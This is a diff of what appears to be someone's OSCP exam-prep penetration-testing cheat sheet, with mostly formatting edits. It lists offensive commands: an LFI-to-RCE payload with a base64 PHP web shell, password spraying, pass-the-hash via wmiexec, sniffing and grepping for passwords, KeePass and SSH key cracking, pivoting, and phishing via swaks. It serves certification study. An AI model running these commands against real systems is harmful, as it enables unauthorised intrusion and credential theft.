@@ -25,6 +25,7 @@ author_profile: true
 ## nmapautomator
 - https://github.com/21y4d/nmapAutomator
 - ./nmapAutomator.sh --host \<Target IP> --type All (or Network/Port/Script/Full/UDP/Vulns/Recon)
+
 # Web
 ## Directory Scanning
 ### Gobuster
@@ -83,7 +84,7 @@ Ex: exploiting a page called admin.php
 	1. curl "http://\<host>/\<directory>/index.php?page=**data://text/plain**,<?php%20echo%20system('ls');?>"
 		- This shows that we can execute embeeded data via LFI. 
 	2. But because some of our data like "system" may be filtered, we can encode it with base64 and try again. 
-	3. echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+	3. echo -n '<?php echo system($_GET["cmd"]);?>' \| base64
 		- PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
 	4. "http://\<host>/\<directory>/index.php?page=**data://text/plain;base64**,PD9waHAgZW
 NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
@@ -144,6 +145,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 	- to download file
 - smbclient //\<target>/\<share> --directory path/to/directory --command "put file.txt"
 	- to upload file
+<br>
 # SMTP
 ### onesixtyone
 - onesixtyone -c \<file containing community strings (public, private, manager)> -i \<file containing target ips>
@@ -191,10 +193,10 @@ netstat -ano - liust all active network connections
   -n = disable name resolution
   -o = show process ID for each connection
   Displays 32 bit applications, remove 'select displayname' for more info
-  - Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+  - Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" \| select displayname
 
  Displays 64 bit applications, remove 'select displayname' for more info
- - Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+ - Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" \| select displayname
  
 Get-Process - show running processes
 Get-Process \<processName> | Format-List * - get all information about a process
@@ -210,33 +212,34 @@ Get-History - may not work
 	- Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue (for Keepass db)
 - Download file from remote server
 	- iwr -uri http://\<server IP>/file.ext -outfile file.ext\
+<br>
 ### Checking privileges on service binaries
   - icacls (Windows utility) or  
   - Get-ACL (PowerShell Cmdlet)
+ <br>
 ### winpeas.exe
 ./winpeas.exe
+<br>
 ## Active Directory
 ### PowerView.ps1
 (Import-Module .\PowerView.ps1)
 (May Need "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser")
 - Get-NetDomain
 - Get-NetUser
-- Get-NetUser | select cn (common name)
-- Get-NetUser | select cn,pwdlastset,lastlogon
-- Get-NetGroup | select cn
-- Get-NetGroup "Fart Department" | select member (get members of the Fart Department)
+- Get-NetUser \| select cn (common name)
+- Get-NetUser \| select cn,pwdlastset,lastlogon
+- Get-NetGroup \| select cn
+- Get-NetGroup "Fart Department" \| select member (get members of the Fart Department)
 - Get-NetComputer
 - Get-ObjectAcl -Identity <username>
-- Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select 
-
-SecurityIdentifier,ActiveDirectoryRights
+- Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
           - (For example, pick different items to select)
 - Convert-SidToName <SID> (like S-1-5-21-1987370470-658905705-1781884369-1103)
 - Find-LocalAdminAccess (scanning to find local admin privileges for our user)
 
 - Get-NetSession -ComputerName <name of computer>
 (The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.)
-- Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
+- Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ \| fl
 - Get-NetUser -SPN | select samaccountname,serviceprincipalname
           (Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. To obtain a clear list of SPNs, we can pipe the output into select and choose the samaccountname               and serviceprincipalname attributes)
 - Find-DomainShare
@@ -280,7 +283,7 @@ Invoke-AllChecks
 - uname -a
 - hostname
 - ps -aux
-	- watch -n 1 "ps -aux | grep pass"
+	- watch -n 1 "ps -aux \| grep pass"
 - ipconfig
 - ss -anp or netstat
 - dpkg -l (to list applications installed by dpkg)
@@ -288,7 +291,7 @@ Invoke-AllChecks
 - cat any /home/.history files
 - check /home/.ssh for keys
 - su root (can't hurt to try)
-- sudo tcpdump -i lo -A | grep "pass"
+- sudo tcpdump -i lo -A \| grep "pass"
 
 ## Privilege Escalation
 ### Automated tools
@@ -306,18 +309,18 @@ OR
 
 # Port Forwarding
 ## Ligolo
-https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9
+https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9 <br>
 **Basic usage**
-	- From Kali:
+From Kali:
 		- sudo ip tuntap add user pop mode tun ligolo
 		- sudo ip link set ligolo up
 		- sudo ip route add \<target ip.0/24> dev ligolo
 		- ./proxy -selfcert
-	- From Windows Target (agent file):
+From Windows Target (agent file):
 		- .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
-	- From Linux Target (agent file):
+From Linux Target (agent file):
 		- ligolo -connect \<kali IP>:11601 -ignore-cert
-	- Then from Kali:
+Then from Kali:
 		- Session
 		- 1
 		- Start
@@ -339,15 +342,17 @@ While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I f
 	- wget http://\<kali IP>:\<serving port>/file
 ### Over RDP
 - xfreerdp /u:admin /p:password /v:10.10.172.151 /drive:\/<directory>,\<name>
+<br>
 ### SMB
 - From kali: 
 	- sudo impacket-smbserver -smb2support share . -username <kali user> -password <kali pass>
 - From target:  
 	- net use m: \\\<kali IP>\share /user:<kali user> <kali pass>
 	- copy/get file.txt m:\
+<br>
 ### SSH/SCP
 scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
-  
+ <br>
 ### wsgidav
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /<directory you want to share>
 - host specifies the host to listen to, "0.0.0.0" means all interaces, "--auth=anonymous" disables authentication (fine for sharing specific files during this context), and the "--root" flag specifies the directory to share. 
@@ -360,11 +365,12 @@ crackmapexec smb <IP> -u <user file> -p '<password>' -d domain.com --continue-on
 .\kerbrute_windows_amd64.exe passwordspray -d domain.com .\usernames.txt "<password>"
 ## Impacket
 ### mssqlclient
-impacket-mssqlclient /<user>:/<pass>@/<target> -windows-auth
+impacket-mssqlclient \<user>:\<pass>@\<target> -windows-auth
 ### psexec 
 ### wmiexec
 - impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@/<target> (can be 0/24)
 	- Requires an SMB connection through the firewall, the Windows File and Printer Sharing feature must be enabled, and the admin share called ADMIN$ must be available. 
+<br>
 ## Metasploit
 ### Initial Usage
 Selecting a module:
@@ -432,16 +438,18 @@ Payloads (msfvenom)
 - hashcat -m 0 \<hashfile> /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show
 - hashcat -m 13400 \<keepass hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force --show
 - check hashcat for which mode to use (searching for KeePass in this case)
-	- hashcat --help | grep -i "KeePass" 
-	- hashcat -h | grep -i "ssh"
+	- hashcat --help \| grep -i "KeePass" 
+	- hashcat -h \| grep -i "ssh"
 ### john the ripper
 - ssh2john id_rsa > ssh.hash 
 - keepass2john \<database_name>.kdbx > keepass1.hash
+<br>
 ## ssh
 ### creating ssh key
 - ssh-keygen
 - ssh -p 2222(unless 22) -i created_key(no pub) user@host.com
 - Using a -d_sa (private key) from /home/user/.ssh/id_sa
+<br>
 ### Finding key protected by password: if ssh key protected by a password
 1. may need to chmod 600 id_rsa (too many permissions won't work)
 2. ssh2john id_rsa > ssh.hash
@@ -453,6 +461,7 @@ Payloads (msfvenom)
 - swaks --to <recipient@email.com> --from <sender@email.com> -ap --attach @<attachment> --server \<mail server ip> --body "message" --header "Subject: Subject" --suppress-data
 	- You will need the password of the mail server user (likely the sender)
 	- Note that the mail server may not be the same machine as the user who opens the email
+<br>
 ## Wordpress Cheatsheet
 ### wpscan
 - wpscan --url http://\<url --api-token \<APItoken>
@@ -512,8 +521,9 @@ For the field that says "place your shellcode here," such code can be generated 
 
 ## Buffer Overflow
 As these are my OSCP notes, and there is no longer a buffer overflow machine on the exam, I'm leaving this content out of the guide for brevity. Instead I'll link a resource which turned out to be better and more succinct than the notes I took on the subject when I went through the course. Here is [V1n1v131r4's guide on Buffer Overflows](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow). 
-
+<br>
 ## Upgrading Shells to fully interactive
+<br>
 ### Python
 1. python -c 'import pty; pty.spawn("/bin/bash")'
 2. background reverse shell using CTRL-Z
@@ -527,6 +537,6 @@ As these are my OSCP notes, and there is no longer a buffer overflow machine on 
 8. export SHELL=bash
 9. export TERM=xterm-256 color (for example)
 10. stty rows 38 columns 116 
+<br>
 ### Without Python
 script /dev/null
-
